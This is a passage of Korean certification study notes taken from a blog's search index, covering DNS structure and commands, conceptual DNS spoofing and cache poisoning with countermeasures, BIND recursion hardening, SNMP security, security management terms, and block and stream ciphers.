Cache 갱신                           Resolver 가 사용자에게 IP 주소를 전달                           사용자 브라우저가 IP 주소로 HTTP 요청                                                                                                                                                                           리눅스 네임서버 설정파일     /etc/resolv.conf : 기본 네임 서버 설정정보            resolver : 질의 변환기, 재귀적 질의       cat /etc/resolv.conf               domain localdomain       search localdomain       nameserver 192.168.172.1 // 기본 네임서버 주소                           /etc/hosts : 도메인/호스트명과 IP주소 매핑 정보            hosts 파일은 대부분의 운영체제에 존재한다.       cat /etc/hosts               192.168.10.100 www.abc.com       ...                           /etc/host.conf : DNS 질의 순서를 지정            cat /etc/host.conf               order hosts, bind // hosts 파일에 먼저 질의하고, bind(nameserver) 에 질의                           DNS 패킷 분석     개요            DNS Message 는 Query 패킷, Response 패킷이 있다.       DNS Message 구조는 아래와 같다.                    Header                            ID : 패킷 식별자 (요청-응답 쌍)                                                                                               QR                       OPcode                       AA                       TC                       RD                       RA                       Z                       RCODE : Flag                                                                                             QR (Query/Response)                                            DNS 메세지가 DNS 질의(0),DNS 응답(1) 인지를 구분                                                           Op code (Operation code) : 4 비트                                            0  :  표준 질의 또는 표준 질의에 대한 응답                       1  :  역 질의 (Inverse Query)                       2  :  서버의 상태 요구                       4  :  통지                       5  :  갱신                                                           AA (Authoritative Answer, 책임 플래그)                                            DNS 응답 메세지에 만 사용됨                       1  :  네임서버 권한이 인정된 서버일 때                                                           TC (Truncated)                                            512 바이트 초과 여부                       1  :  응답메세지가 512 바이트 이상이라서  512로 짤리어짐                                                    이 경우에 클라이언트는 TCP 포트를 통해 질의를 재전송하게 됨                                                                                                           RD (Recursion Desired, 재귀 요구 플래그)                                            1  :  클라이언트가 재귀 질의를 원함                                                    질의메세지에서 지정되며, 응답메세지에서 이를 반복함                           재귀질의가 요청되지 않으면, 반복질의로 간주하게됨                                                                                                           RA (Recursion Available, 재귀 유효 플래그)                                            네임서버가 재귀 질의가 이용 가능한지를 나타냄                                                           예약 (Reserved) : 통상 000 으로 셋팅                   rCode (response code, 응답/오류 코드)                                            0 =&gt; No Error, 1 =&gt; Format Error(질의를 이해할 수 없음), 2 =&gt; ServFail(Server Failure), 3 =&gt; 도메인네임 존재 않음 등                                                                                       QDCOUNT (질의 카운트)                                    질의의 수                                               ANCOUNT (응답 카운트)                                    응답 RR(Resource Record)의 수                                               NSCOUNT (네임서버 카운트)                                    책임 RR(Resource Record)의 수                                               ARCOUNT (추가정보 카운트)                                    추가 RR(Resource Reocrd)의 수                                                                   Question           Answer           Authority           Additional                       DNS 는 일반적으로 UDP 53번 포트를 사용 (512 Bytes 미만 패킷)       DNS 는 TCP 53번 포트로도 사용 가능 (512 Bytes 이상 패킷)                    Zone Transfer (Zone 전달)                            Master 서버에서 Slave 서버에 Zonefile(Masterfile) 전달                                    주기적 전달                                               신뢰할 수 있는 연결 필요                                   큰 DNS 쿼리를 보낼 때 이용           UDP 패킷으로 질의 (query) 했으나 응답패킷 (Response) 이 512Bytes 를 초과할 경우 Response 가 Truncated 되고 TCP 로 요청하라는 메시지 전송                           DNS 관련 명령어     DNS Cache 조회            윈도우                    ipconfig /displaydns : DNS 캐시 정보 조회                            DNS 스푸핑 등 확인                                   ipconfig /flushdns : DNS 캐시 정보 초기화                            결과메시지 : successfully flushed the DNS Resolver Cache                                                   DNS 조회            윈도우                    nslookup : DNS 진단 유틸리티, 네임서버 검색, 대화형모드                            nslookup [호스트(도메인 이름/IP주소)] ([네임서버]) : 질의형                                    정방향조회 (Forward DNS Lookup) : 도메인 -&gt; IP                   역방향조회 (Reverse DNS Lookup) : IP -&gt; 도메인                                                                               리눅스 / 유닉스                    dig : Domain Information Groper : nslookup 과 기능 유사하나 더 다양한 정보를 획득                            dig ([@네임서버]) [도메인] ([쿼리유형]) ([쿼리옵션])                                    쿼리유형                                            A : 도메인 IP 주소 질의                                                           쿼리옵션                                            +norecurse : Authoritative NS 에 반복적 질의 수행, 정상 응답이 되는지 여부를 체크                                                    dig @ns.test.com www.daum.net +norecurse                                                                       +tcp : 53/tcp 포트를 허용하는지 체크                       +trace : 계층 구조의 쿼리 (Root -&gt; .com -&gt; …) 위임의 상태를 추적                                                    dig @ns.test.com www.daum.net +trace                                                                                                                                                           whois : whois 서버를 활용, 도메인 등록정보(소유정보) 확인                            whois www.test.com                                    등록인, 주소, 변경일, IP 주소 (ISP 주소), 네트워크 할당정보 등…                                                                   host 호스트 [서버] : nslookup 과 유사                           DNS 스푸핑     개요            공격대상자에게 전달되는 DNS 응답을 위조       DNS서버에 위조된 IP 주소를 지정       피해자가 의도하지 않은 주소로 접속하게 하는 공격 기법       DNS 프로토콜은 Query/Response 를 UDP 프로토콜을 사용하여 주고받음                    UDP : 비연결성에서 생기는 취약점 이용                            Transaction ID 값이 일치하면 응답을 신뢰하게 됨               나중에 도착한 값은 폐기됨                                                   방식            스니핑을 이용한 스푸핑 공격                    희생자에게 전달되는 DNS 응답 위조                       DNS 캐시 포이즈닝                    DNS 서버의 캐시정보 조작                           DNS 스푸핑 과정            Client -&gt; (Attacker) -&gt; Name Server : Attacker 는 중간에서 Snipping                    Transaction ID : 1000           Src Port : 4500           Q : www.test.com           A :                       Client &lt;-  Attacker     Name Server : Attacker 가 Spoofing 응답값 전달                    먼저 수신된 DNS 응답을 신뢰           Transaction ID : 1000           Dst Port : 4500           Q : www.test.com           A : 위조된 IP                       Client &lt;- (Attacker) &lt;- Name Server : 정상응답은 폐기됨                    Transaction ID : 1000           Dst Port : 4500           Q : www.test.com           A : xxx.xxx.xxx.xxx                           DNS 스푸핑 대응책            스니핑을 탐지, 차단       DNS 서버 질의 전 우선순위가 높은 hosts 에 중요한 IP 주소를 등록관리           DNS 캐시 포이즈닝 과정            Attacker -&gt; Recursive Server                    여러 개의 질의를 한꺼번에 보냄                            www.test.com 질의               Recursive Server 는 Authoritative 서버에 여러 번 질의 (반복적 질의에 시간 소요됨)                                               Attacker -&gt; Recursive Server                    여러 개의 응답을 한꺼번에 보냄                            www.test.com 응답                                    Transaction ID 무작위 입력                   Dst Port 무작위 입력                   IP 주소 조작                                               Recursive Server 가 Authoritative 서버에 응답을 받기 전에 Transaction ID 와 Dst Port 가 일치하는 응답값을 전송                                    뒤에 도착하는 실제 응답은 폐기됨                                               TTL 지속 시간동안 조작된 IP 로 응답하게 됨                                                   Primary(Master) / Secondary(Slave) 네임 서버의 이해     주서버(Master) : 1차 네임서버            원본 존 데이터를 관리하는 서버           보조서버(Slave) : 2차 네임서버            마스터서버에 있는 존 데이터를 복사하여 가지고 있음       Master 와 동일한 기능을 함                    부하 분산을 통해 안정성을 높임           마스터 장애시 대신 역할을 수행                           구조            Master NS &lt;-&gt; Slave NS                    Zone transfer : TCP 53                            Master 서버와 Slave 서버 간 ZoneData 동기화                                    Zone File(MasterFile)                   Reverse Zone File                                                                                   Recursive Query의 제한 방법     필요성            대량의 재귀적 질의 요청이 발생하면 DoS 형태의 공격으로 악용될 수 있음       DNS Cache Poisoning 공격       사내 DNS 서버의 경우 재귀적 질의 접근제어 설정이 필요                    설정파일 : /etc/named.conf                           /etc/named.conf           acl \"mynetwork\" { 192.168.0.0/24;};       options {           listen-on port 53 {127.0.0.1; 192.168.0.254;};           directory \"/var/named\";           allow-query {mynetwork;};           allow-recursion {none;}; // 재귀적 질의 제한 설정           allow-recursion {127.0.0.1; 192.168.170.10/30;}; // 재귀적 질의 제한 설정           recursion no; // // 재귀적 질의 제한 설정           // allow-transfer {any;}; // 존전송 제한 설정           allow-transfer {none;}; // 존전송 제한 설정           //forwarders {0.0.0.0;};       };          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-DNS/",
        "teaser": null
      },{
        "title": "정보보안 - SNMP(Simple Network Management Protocol)",
        "excerpt":"SNMP (Simple Network Manage Protocol)     개요            간이 망 관리 프로토콜                    TCP/IP 초창기에는 ICMP 프로토콜의 ping 을 이용해 장비간 연결 상태 파악                            Host 수의 증가로 네트워크 시스템이 복잡해짐 -&gt; 관리의 어려움                                   1988년 IAB (인터넷 표준제안 위원회) 에서 표준 작업을 시작                            SGMP -&gt; SNMP                                   네트워크 장비를 관리, 감시하기 위한 프로토콜           UDP, 응용계층 표준 프로토콜           모니터링 / 컨트롤           네트워크 관리 시스템 (NMS - Network Management System) 에서 사용                            정기적으로 관리정보 수집 (SNMP Protocol)               실시간으로 네트워크 상태 모니터링, 설정 (SNMP Protocol)                                               대부분의 OS 에 탑재       네트워크 관리 정보를 얻기 위해서 관리 프로그램이 필요                    SNMP 는 Protocol           관리 프로그램 필요           관리시스템, 관리대상 필요                           SNMP 구조            관리시스템 Manager 모듈 (162/UDP)                    Manager 모듈이 Agent 모듈을 조회           Agent 는 Manager 에 응답                       관리대상 Agent 모듈 (161/UDP)                    Agent 는 Manager 에 Trap 전송                       MRTG (Multiple Router Traffic Grapher)                    SNMP 기반의 장비 모니터링 프로그램           네트워크 상에 발생하는 트래픽 사용량 모니터링           MIB 를 이용해 정보 수집 가능                       MIB (Management Information Base)                    관리장치에 대한 정보가 모인 데이터베이스           Agent 각각이 MIB를 가지고 있음                           SNMP 동작 (PDU)            Manager -&gt; Agent                    Get Request : MIB 정보 요청                       Manager &lt;- Agent                    Get Response                       Manager -&gt; Agent                    Get Next Request : 이미 요청한 정보의 다음 정보 요청                       Manager &lt;- Agent                    Get Response                       Manager -&gt; Agent                    Set Request : MIB 설정 요청                       Manager &lt;- Agent                    Get Response                       Manager &lt;- Agent                    Trap : Agent 가 Manager 에게 비동기적으로 알림 (Notify)                           SNMP 통신을 위한 3가지 조건            SNMP 버전이 일치해야 함                    v1                            SGMP (Simple Gateway Management Protocol) 를 발전시킴               보안기능(암호, 인증) 없음               community string 만 일치하면 모든 정보 획득가능               평문 전송 (Snipping 노출)                                   v2                            보안기능 추가                                    대칭키 암호화 알고리즘 (DES)                   해시 알고리즘 (MD5)                                               송신처 인증 기능이 없음               SNMP v2c                                    복잡한 보안기능 제거, 보안상 취약                   평문 전송 (Snipping 노출)                                                                   v3                            Data 인증               암호화               재사용방지               접근통제                                               Community String                    송수신 하기 전 미리 인증을 하기 위해 사용하는 P/W                       PDU (Protocol Data Unit) 이 일치해야 함                    통신하기 위한 메시지 유형                            Get Request &lt;–&gt; Get Response                                   Read 형                            SNMPv1                                    Get Request                   Get Next Request                                               SNMPv2 / v3                                    Get Request                   Get Bulk Request : 요청 객체의 범위를 지정                                                                   Write 형                            SNMPv1                                    Set Request                                               SNMPv2 / v3                                    Set Request                                                                   Response 형                            SNMPv1                                    Get Response                                               SNMPv2 / v3                                    Response                                                                   Trap                            SNMPv1                                    Trap                                               SNMPv2 / v3                                    TrapV2                   InformRequest : Manager 가 다른 Manager 에 정보를 요청할 때 사용                   Report : 다른 Manager 에 보고할 때 사용                                                                                   (SNMPv3 기준) Message 구조                                                            버전               공통 Header               보안 매개변수               PDU 데이터                                                     공통 Header 부                                                                                                            메시지 ID                       메시지 최대크기                       메시지 Flag                       메시지 보안모델                                                                                             메시지 보안모델                                            USM (User Security Model)                       VACM (View-based Access Control Model) 모델                                                                                                           보안 매개변수 부                                                                                                            재전송                       공격                       방지                       메시지위변조                       방지                       암호 매개변수                                                                                             재전송 공격방지                                            SNMP 엔진 IP (Authoritative 엔진 ID)                       부트횟수 (Authoritative 엔진부트 횟수)                       엔진 시간정보 (Authoritative 엔진 time)                                                                                                                                                           메시지위변조 방지 (HMAC) - MD5                           SHA                                                                                                                 사용자 인증 매개변수                                                           암호 매개변수 (DES-CBC)                                                                                   SNMP 데이터 수집 방식            Polling : Manager 가 Agent 에 요청하면 응답       Event Report : Agent 가 Manager 에 Trap Message 전송 (Notify)           SNMP 취약점            DoS 공격 취약점       버퍼오버플로우 취약점       비인가접속 취약점           SNMP 보안            SNMP는 관리자 입장에서 매우 중요한 정보를 제공       SNMP에 읽기, 쓰기 권한이 있는데 쓰기 권한은 사용 자제                    Set Request 제한                       SNMP v3 에서 보안 서비스를 제공       community string                    SNMP 데몬 (manager) 와 클라이언트 (Agent) 간 데이터 송수신 전 인증 필요           인증을 위해 사용하는 패스워드                       읽기모드 RO (Read Only) / 쓰기모드 RW (Read Write)       MIB : 관리장치에 대한 정보가 모인 데이터베이스                    관리되어야 할 정보, 자원 =&gt; 객체의 집합체           객체별 트리형식 구조           SMI (Structure Management Information)                            객체의 구조, 형식               ASN.1 (Abstract Syntax Notation) 언어 사용                                    Data 와 Data 속성을 설명하기 위한 공식 언어                   name (OID:Object Identifier)                   syntax (객체의 Data 유형)                   encoding (Message 전송 시 비트변환 규칙)                                            BER : encoding rule 중 하나                                                                                                                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-SNMP/",
        "teaser": null
      },{
        "title": "정보보안 - 정보보호관리",
        "excerpt":"정보보호 개요     정보화 사회            정보화 사회 : 단일 생활권                    사회 모습 변화           전자 메일, 인터넷으로 정보 교환, 재택근무, 홈뱅킹           미래 사이버 전쟁                       정보화 역기능                    사회 문제 뿐만 아니라 국가 안위에까지 위협           프라이버시 침해, 해커와 바이러스 기승, 컴퓨터 범죄 등           스마트폰 사용으로 정보보호가 더 중요해짐                       사이버환경의 특징                    비대면성, 익명성, 시간 및 공간적 운영의 무제한성, 무제한적인 정보 및 신속한 전송, 미래의 범죄 및 전쟁 공간                           정보보호            정의                    정보의 수집, 가공, 저장, 검색, 송신, 수신 중에 발생하는 정보의 훼손, 변조, 유출 등을 방지하기 위한 관리적, 기술적 수단 또는 그러한 수단으로 이루어지는 행위           기밀성, 무결성, 가용성, 인증성 및 부인방지를 보장하기 위하여 기술적/물리적/관리적 보호대책을 강구하는 것           정보보호 관리, 컴퓨터 및 데이터 보안, 네트워크 보안과 정보보호 정책                       정보의 가용성과 안정성 (보안성)                    정보보호는 정보의 활용과 정보의 통제 사이에서 균형감각을 갖는 행위           사용 가능한 자원을 쉽게 얻을 수 있으면서도 정보에 위협이 되는 요소들을 최소화           정보의 활용 : 가용성의 극대화           정보의 통제 : 안정성을 확보하기 위해 최대한 통제                       정보보호의 목표                    기밀성                            오직 인가된 사람, 인가된 프로세스, 시스템만이 알 필요성에 근거               데이터 기밀성 : 개인정보나 기밀정보를 부정한 사용자가 이용하거나 그들에게 노출되지 않도록 하는 것               프라이버시 : 개인과 관련된 어떤 정보가 수집되고 저장되는지, 누구에게 그 정보가 공개되는지, 누가 공개하는지 등을 통제하거나 영향이 미칠수 있도록 하는 것               접근제어, 암호화 등                                   무결성                            네트워크를 통하여 송수신되는 정보의 내용이 불법적으로 생성, 변경, 삭제되지 않도록 보호               전력차단과 같은 시스템 중단이 정보에 예상치 못한 변형을 일으킬 수 있음               접근제어, 메시지 인증, 침입 탐지, 백업                                   가용성                            시스템이 지체없이 동작하도록 하고, 합법적 사용자가 서비스 사용을 거절당하지 않도록 하는 것               정보는 지속적으로 변화, 인가된 자가 접근할 수 있어야 함.               데이터 백업, 중복성 유지, 물리적 위협요소로부터의 보호                                   인증성                            실체, 신뢰할 수 있는 데이터인지 확인               전송 메시지나 메시지 출처에 대한 유효성, 신뢰성                                   책임추적성                            부인방지 (부인봉쇄), 억제, 결함분리, 침입탐지 예방, 법적인 조치               포렌식                                                   정보보호 관리            정보보호 관리의 개념                    정보는 기업이나 공공기관의 중요한 자산           비인가자에게 노출되지 않도록 관리해야 함                            기업이나 조직의 목적을 충족시키면서 위험 수위를 낮추는 것               위험은 제거 대상이 아닌 관리(감소) 대상임                                    최고 경영자의 지원과 관심 필요                                                                   정보보호 관리시스템                            ISMS : 정보보호 관리체계                                               정보보호 관리와 정보보호 대책                    &lt;    &lt;     물리적 보호대책&gt; 관리적 보호대책&gt;           기술적 보호대책                            정보 시스템, 통신망, 정보를 보호하기 위한 가장 기본적인 대책               접근통제, 암호기술, 백업체계, 정보시스템 자체에 보안성이 강화된 시스템 소프트웨어 사용 등                                   물리적 보호대책                            자연재해로부터 정보시스템이 위치한 정보처리시설을 보호하기 위한 재해대책               불순 세력이나 적의 파괴로부터 출입통제, 시건장치 등                                   관리적 보호대책                            법, 제도, 규정, 교육 등을 확립, 보안 계획을 수립하고 이를 운영               위험 분석 및 보안감사 시행               기술적 보호대책을 계획, 설계, 제도/정책/절차 생성               내부자의 부당행위 방지 교육                                               정보보호 관리                    정보보호 관리는 기업과 조직의 비즈니스 목적을 충족시키면서 수용가능한 수준으로 위험을 낮추는 것           위험은 제거 대상이 아닌 관리 대상           위험은 식별되거나 감소될 수 있지만 제거될 수 없음           정보보호 관리를 위해서는 최고 경영진의 지원과 관심이 필요                           OSI 보안 구조            개요                    기본개념                            ITU-T (국제 전기통신 연합 - 전기통신표준화 부문) X.800                                    관리자가 효과적으로 보안문제를 조직화 할 수 있는 유용한 방법                                               보안공격 : 기관이 소유한 정보의 안정성을 침해하는 제반 행위               보안 매커니즘 : 보안공격을 탐지, 예방하거나 침해를 복구하는 절차               보안 서비스 : 조직의 보안을 강화하기 위한 처리 또는 통신 서비스, 보안 공격에 대응, 하나 이상의 보안 메커니즘을 사용                                   보안 공격                            보안의 세 가지 목표 (기밀성,무결성,가용성) 은 보안공격에 위협을 받을 수 있음                                    기밀성을 위협하는 공격                                            스누핑 (Snooping) : 데이터에 대한 비인가 접근 또는 탈취                       트래픽 분석 (Traffic Analysis) : 암호화 되어 있을지라도 온라인 트래픽을 분석해 다른 형태의 정보를 얻을 수 있음                                                           무결성을 위협하는 공격                                            변경 (메시지 수정, Modification) : 적법한 메시지의 일부를 불법으로 수정하거나 메시지 전송 순서를 바꾸는 것                       가장 (Masquerading) : 신분위장은 한 개체가 다른 개체의 행세를 하는 것                       재연 (재전송, Replaying) : 적극적 공격의 하나로 획득한 데이터 단위를 보관하고 있다가 시간이 경과한 후에 재전송함으로써 인가되지 않은 사항에 접근하는 효과를 노리는 행위                       부인 (Repudiation) : 메시지의 송신이나 수신을 부인                                                           가용성을 위협하는 공격                                            서비스 거부 (Denial of Service) : 매우 일방적인 공격. 시스템의 서비스를 느리게 하거나 완전히 차단                       물리적 공격                                                                                       소극적 공격과 적극적 공격                                    소극적 공격 : 정보를 획득하거나 사용하려는 시도, 시스템 자원에는 영향을 끼치지 않음                                            Snooping                                                    Snooping : 도청 + 탈취                           Snipping : 도청                                                                       Traffic Analysis                       공격자의 목표는 정보 획득                                                           적극적 공격 : 시스템 자원을 변경하거나 시스템 작동에 영향을 끼치는 공격 형태                                            변조, 가장, 재연, 부인                       DoS, 물리적 공격                       무결성과 가용성을 위협                       공격자가 다양한 방법을 사용 : 방어보다 탐지가 더 쉬움                                                                                                           보안 서비스                            보안 정책을 구현하고 보안 메커니즘에 의해 구현되는 것               서비스 종류                                    기밀성 / 무결성 / 가용성                   인증                   부인방지                   접근제어                                                                                   기본 보안용어 정의            자산 (Asset)                    조직이 보호해야 할 대상, 데이터 혹은 자산 소유자가 가치를 부여한 실체           하드웨어 : 컴퓨터 시스템, 데이터 처리/저장/통신 장비           소프트웨어 : 운영체제, 시스템 도구, 어플리케이션           데이터 : 파일, 데이터베이스, 암호파일과 같은 보안 관련 데이터           통신 설비와 네트워크 : 지역과 광역 네트워크 통신 연결, 브리지, 라우터 등                       취약점 (Vulnerability)                    위협의 이용대상으로 관리적, 물리적, 기술적 약점 (정보보호 대책 미비)                       위협 (Threat)                    손실이나 손상의 원인이 될 가능성을 제공하는 환경의 집합                            자연재해               인간에 의한 의도적 위협 : 해커, 바이러스, 도청 등               인간에 의한 비의도적 위협 : 실수, 태만                                   보안에 해를 끼치는 행동이나 사건           가로채기 (interception)                            비인가된 당사자가 자산으로의 접근을 획득한 것을 의미               불법 복사, 도청 등               기밀성에 영향                                   가로막음 (interruption)                            시스템 자산이 손실되거나 사용 불가능하게 됨               하드웨어 장치의 악의적 파괴, 파일 삭제, 서비스 거부 등               가용성에 영향                                   변조 (modification)                            비인가된 당사자가 접근하여 그 내용을 변경               데이터베이스 값 변경, 특정 프로그램 변경               무결성에 영향                                   위조 (fabrication)                            비인가된 당사자가 컴퓨터 시스템 상 불법 객체의 위조 정보를 생성               네트워크 통신에 가짜 거래 정보를 생성               무결성에 영향                                               위협원 (Threat agents)                    정보자산에 해를 끼치는 행동을 할 수 있는 실체           해커, 일반 사용자, 컴퓨터 프로세스, 재난 등           취약점을 이용하는 존재                       위험 (Risk)                    예상되는 위협에 의해 자산에 발생할 가능성이 있는 손실의 기대치           자산의 가치, 취약점, 위협 요소의 능력, 보호 대책 효과 등에 의해 영향을 받음           위협원이 취약점을 이용하여 위협이라는 행동을 통해 자산에 악영향을 미츤ㄴ 결과를 가져올 가능성           위험 = 자산 * 위협 * 취약점                       노출 (Exposure)                    위협 주체에게 손실(losses)을 드러내 보이는 경우           취약점은 발생 가능한 피해를 노출시킴           패스워드 관리가 느슨하고 패스워드 규정이 집행되지 않으면, 사용자들의 패스워드가 유출되고 허가되지 않은 방법으로 사용될 가능성에 노출될 수 있음                       안전장치/보안대책 (Safeguard / Countermeasures)                    각종 위협이나 변경을 방어하거나 감소시키며 자산을 보호하는 기술, 정책 또는 절차           위험을 완화하기 위한 예방적 수단                       잔여 위험 (Residual Risk)                    정보보호대책을 구현한 후 남아있는 위험                       다계층 보안 / 심층 방어 (Defense in Depth)                    Multi Layered(Level) Security           여러 계층의 보안 대책이나 대응수단을 구성하는 것           한 가지 통제가 대응에 실패하더라도 전체 시스템을 위험에 빠트리지 않음           시스템의 취할 수 있는 가장 최선의 보안 접근 방법                            보호, 탐지, 대응                                               직무상의 신의성실, 노력 (Due Care, Due Dilligence)                    Due : 특정 목적을 위하여 필요하거나 요구되는 적절하고 충분한 의무           Due Care : 특정 목적을 위하여 필요하거나 요구되는 충분한 주의           Due Diligence : 특정 목적을 위하여 필요하거나 요구되는 충분한 노력                       사회공학 (Social Engineering)                    컴퓨터 보안에서 인간 상호 작용의 깊은 신뢰를 바탕으로 사람드을 속여 정상적인 보안절차를 깨트리기 위한 비기술적 침입 수단           담당자와 신뢰를 쌓고 전화나 이메일을 통해 도움을 받고, 약점을 이용                       가장 약한 링크 원칙 (Principle of Weakness Link)                    보안은 가장 약한 링크보다 더 강할 수 없음           방화벽에 전력을 공급하는 전원장치, 보안응용 기반으로 동작하는 운영체제, 제어수단을 기획/실현하고 관려하는 사람 중 어떤 하나의 제어수단의 실패가 전체 보안 실패를 야기           보안 상 모든 취약점을 파악 vs 공격자는 하나의 취약점을 이용해 공격 (비대칭)                       시점별 통제(Control)                    취약점을 감소시키거나 억제하기 위해 사용되는 매커니즘           예방통제 (Preventive Control)                            사전에 위협과 취약점을 대처               IPS                                   탐지통제 (Detective Control)                            위협을 탐지하는 통제               빠른 탐지일수록 대처에 용이               IDS                                   교정통제 (Corrective Control)                            사후처리               이미 탐지된 위협이나 취약점에 대처               위협이나 취약점을 감소시키는 통제                                   유효성의 원칙 : 제어수단이 효과적이고 적절하게 사용되어야 함.                       대응 : 피해 최소화, 보고, 장비, 기법, 행위, 방지          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","정보보안 관리"],
        "url": "https://bluesplatter.com/is_certification/IS-Management-Outline/",
        "teaser": null
      },{
        "title": "정보보안 - 블록 암호 / 스트림 암호",
        "excerpt":"대칭키 암호     대칭키 암호 = 공통키 암호   비대칭키 암호 = 공개키 암호   현대 블록 암호     개요            기본 개념                    대칭키 블록 암호는 n-비트 평문 블록을 암호화하거나 n-비트 암호문블록을 복호화, k비트 키를 사용           복호화 알고리즘은 암호 알고리즘의 역함수, 동일한 비밀키를 사용           메시지의 길이가 n비트보다 작다면 n비트 블록을 만들기 위하여 padding 추가           대칭키 암호를 안전하게 사용하는 필수 사항                            강한 암호 알고리즘이 있어야 함               비밀키를 안전한 방법으로 획득하고 보관해야 함                                               치환(Substitution) 과 전치(Transposition)                    현대 블록 암호는 치환 암호 혹은 전치 암호로 동작                            암호기법 : 치환, 전치, 블록, 스트림, 합성                                   치환 암호로 설계되면, 평문 비트의 값은 임의의 값으로 대체. (1-&gt;0, 0-&gt;1)                            교환               평문과 암호문의 0과 1의 개수다 다르다.                                   전치 암호로 설계되면, 각각의 비트는 단지 재배열된다.                            위치변경               0과 1중 하나의 값을 가질 수 있다.               n비트 평문 혹은 암호문의 개수는 2의 n승이다.                                   평문을 암호화할 경우 전치 암호의 특성(0과 1의 개수가 유지)는 전수조사 공격에 치명적이다.                            보통 치환 암호로 설계한다.                                               현대 블록 암호의 구성요소                    개요                            확산, 혼돈과 같은 성질을 만족시키기 위하여 전치 요소, 치환 요소, 그 밖의 요소로 결합               공격 방지 암호를 위해 이동요소(shift), 교환요소(swap), 분할요소(split), 조합요소 뿐만 아니라 전치 장치(transposition, P-box)와 치환 장치(substitution, S-box)와 XOR 연산의 조합으로 만듬.                                    XOR 연산 : 같으면 0, 다르면 1                                               대칭키 암호 : 뒤죽박죽 섞음 &gt; 스크램블드 에그와 유사                                   P-Box                            문자 단위로 암호화를 수행했던 고전 전치 암호를 병렬적으로 수행               단순(straight), 확장(extension), 축소(compression) P-박스로 세 가지 종류가 있음.                                    축소 P-박스                                            n 비트를 입력받아 m비트를 출력, n&gt;m을 만족                       입력 중에 특정 비트는 소실                       1, 2, 3, 4, 5 (5종)입력 -&gt; 1, 2, 3 (3종)출력                                                           확장 P-박스                                            n&lt;m을 만족.                       입력 비트 중 특정 비트는 한 개 이상의 출력비트와 연결.                       비트를 치환하고 동시에 다음 단게에서 비트의 양을 증가시키고자 할 때 사용                       1, 2, 3 (3종)입력 -&gt; 1, 2, 3, 4, 5 (5종)출력                                                           역함수의 존재성 : 단순 P-박스는 역함수가 존재하지만 나머지는 존재하지 않는다.                                                                   S-Box                            치환 암호의 축소 모형. S-박스는 입력과 출력의 개수가 달라도 된다.               역함수의 존재성 : 입출력 관계가 테이블 혹은 수학적 관계로 정의되는 암호임. 존재할 수도 있고 없을 수도 있다. 역함수가 존재하면 입출력 비트 개수가 동일하다.               Substitution, Swap, Split, Shift, Combine, Exclusive-OR 이용                                   합성 암호(product Ciphers)                            개요                                    Shannon이 소개                   치환, 전치, 그리고 기타의 구성요소를 결합한 복합적인 암호                                               확산(Diffusion) 과 혼돈(Confusion)                                    설계된 블록 암호가 확산과 혼돈 두 가지 중요한 성질을 갖도록 하는 것                   확산 : 암호문과 평문 사이의 관계를 숨기는 것                   혼돈 : 암호문과 키의 관계를 숨기는 것                                            키의 단일비트가 변화하면 암호문의 모든 비트가 변화함                                                                                       라운드(Rounds)                                    확산과 혼돈은 각 반복이 S-박스, P-박스 그리고 기타 구성 요소들의 결합을 의미하는 반복적 합성 암호를 사용하여 얻어짐                   반복적으로 사용되는 합성 암호를 라운드(round) 라고 칭함                                                                   합성 암호의 종류                            Feistel 암호                                    DES를 포함해서 대부분의 대칭 블록 암호 알고리즘은 1973년 IBM 의 Horst Feistel 이 최초로 소개한 구조를 따라 만들어짐                                               Feistel 암호 특징                                    페이스텔 구조에서 네트워크라는 이름은 그 구성도가 그물을 짜는 것과 같이 교환되는 형태로 구성되어 있기 때문에 붙여짐                   원하는 만큼 라운드 수를 늘릴 수 있음. 라운드 수를 아무리 늘려도 복호화할 수 없게 될 염려가 없음                   암호화/복호화 알고리즘을 따로 구현할 필요가 없음                                               Feistel 암호 예시                                                                                                                                    64비트 평문을 32비트 2개 (L1                           R1) 로 쪼갬                                                                                                           Round1                                            Mixer 과정                                                    R1 을 F(Round 함수)를 거쳐 결과값을 구함                                                            Key 사용 (K1 : Round 마다 값이 틀림)                                                                                   L1 과 결과값을 XOR                                                                       Swaper 과정                                                    위 결과를 새로운 R2로 함                           과정을 거치지 않은 R1을 L2로 함                                                                                                           Round2…                   (라운드가 3라운드 이상일 것)                   (짝수 라운드 구성)                   (역변환이 가능할 것 -&gt; 별도의 복호화 과정이 필요 없음)                   (속도가 빠름)                                               대칭 블록 암호 구현                                    블록 크기(Block Size)                                            블록 길이가 크다는 것은 더 강한 보안을 의미하지만 암/복호화 속도는 떨어짐                       128비트의 블록 크기는 이를 조화시키는 합리적인 크기임                                                           키 길이(Key Size)                                            키 길이가 길다는 것은 더 강한 보안을 의미하지만 속도가 떨어짐                       보통 128비트의 길이를 사용                                                           라운드 수(Number of rounds)                                            라운드 수를 증가하면 보안을 강화할 수 있다. 페이스텔 암호의 핵심                       보통 16 라운드                                                           서브키 생성 알고리즘(Subkey generation algorithm)                                            이 알고리즘이 복잡하면 복잡할수록 암호해독이 어려워짐                                                           라운드 함수(round function)                                            이 알고리즘이 복잡하면 복잡할수록 암호해독이 어려워짐                                                                                       SPN (Substitution Permutation Network)                                    S-Box : 치환 암호의 축소형                                            64bit =&gt; 16bit * 4 (4행 16열)                       6개의 입력값을 받아 4개의 출력값을 출력                       3행 6열의 값 1                       b1, b6 = 행                       b2, b3, b4, b5 = 열                       3행 6열 : 101101                       값 1 : 0001                                                           SPN 암호 예시                                            Plain Text 를 Key0 와 XOR 수행                       S1, S2, S3, S4                       P box (S1, S2, S3, S4 결과 내 각각을 자리이동)                       위 결과를 Key1 와 XOR 수행                       …                                                                                                                       현대 스트림 암호                    개요                            현대 스트림 암호에서 암호화와 복호화는 한 번에 비트를 생성함               스트림 암호는 블록 암호보다 빠름               하드웨어 구현 또한 블록 암호보다 용이               키 스트림을 어떻게 생성하는지가 주 관심사               동기식과 비동기식                                   예시                            P =&gt; Pn, Pn-1 … P2, P1               K =&gt; Kn, Kn-1 … K2, K1                                    의사난수 생성기 이용-PRNG / 언젠가 반복되나 난수의 효과                   보통 128bit                                               C =&gt; Cn, Cn-1 … C2, C1                                   동기식 스트림 암호                            개요                                    동기식 스트림 암호에서 키 스트림은 평문 혹은 암호문 스트림과 독립적                                            비동기식 스트림암호:이전 평문이나 암호문에 종속적 (자기동기식)                                                           키 스트림은 평문 